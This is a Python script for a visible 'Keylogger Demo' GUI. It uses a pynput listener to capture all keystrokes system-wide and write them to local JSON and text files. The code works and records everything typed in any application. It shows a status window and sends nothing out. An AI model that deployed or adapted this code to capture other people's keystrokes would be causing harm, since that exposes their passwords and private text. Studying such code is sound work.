import tkinter as tk
from pynput import keyboard
import os
import threading
import queue

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, 'logs.json')
TXT_FILE = os.path.join(BASE_DIR, 'logs.txt')

held_keys = set()
listener  = None
log_queue = queue.Queue()

def get_key_name(key):
    try:
        return key.char
    except AttributeError:
        return str(key).replace('Key.', '')

def reset_logs():
    open(LOG_FILE, 'w').close()
    open(TXT_FILE, 'w').close()

def writer_worker():
    while True:
        log_text, txt_text = log_queue.get()
        if log_text:
            with open(LOG_FILE, 'a') as f:
                f.write(log_text)
        if txt_text:
            with open(TXT_FILE, 'a') as f:
                f.write(txt_text)
        log_queue.task_done()

threading.Thread(target=writer_worker, daemon=True).start()

def on_press(key):
    name = get_key_name(key)
    if key not in held_keys:
        held_keys.add(key)
        txt = ''
        if hasattr(key, 'char') and key.char:
            txt = key.char
        elif key == keyboard.Key.space:
            txt = ' '
        log_queue.put((f"pressed('{name}'), ", txt))
    else:
        log_queue.put((f"held('{name}'), ", ''))

def on_release(key):
    name = get_key_name(key)
    held_keys.discard(key)
    if key == keyboard.Key.space:
        log_queue.put((f"released('{name}'), space , ", ''))
    else:
        log_queue.put((f"released('{name}'),", ''))

def start_keylogger():
    global listener
    if listener is None:
        reset_logs()
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        status_label.config(text="Status: Running", fg="green")
        start_btn.config(state=tk.DISABLED)
        stop_btn.config(state=tk.NORMAL)

def on_close():
    global listener
    if listener is not None:
        listener.stop()
        listener = None
        held_keys.clear()
    root.destroy()

root = tk.Tk()
root.geometry("260x180")
root.title("Keylogger Demo")
root.resizable(False, False)
root.protocol("WM_DELETE_WINDOW", on_close)

tk.Label(root, text="Keylogger", font="Verdana 14 bold").pack(pady=(20, 5))

status_label = tk.Label(root, text="Status: Idle", font="Verdana 9", fg="gray")
status_label.pack(pady=(0, 15))

start_btn = tk.Button(root, text="Start Keylogger", width=18, command=start_keylogger, bg="#2ecc71", fg="white")
start_btn.pack(pady=4)

stop_btn = tk.Button(root, text="Stop & Exit", width=18, command=on_close, bg="#e74c3c", fg="white", state=tk.DISABLED)
stop_btn.pack(pady=4)

print(f"[+] Keylogger Demo started")
print(f"[!] LOG file: {LOG_FILE}")
print(f"[!] TXT file: {TXT_FILE}")
print(f"[!] Press 'Start Keylogger' in the GUI to begin.")

try:
    root.mainloop()
except KeyboardInterrupt:
    on_close()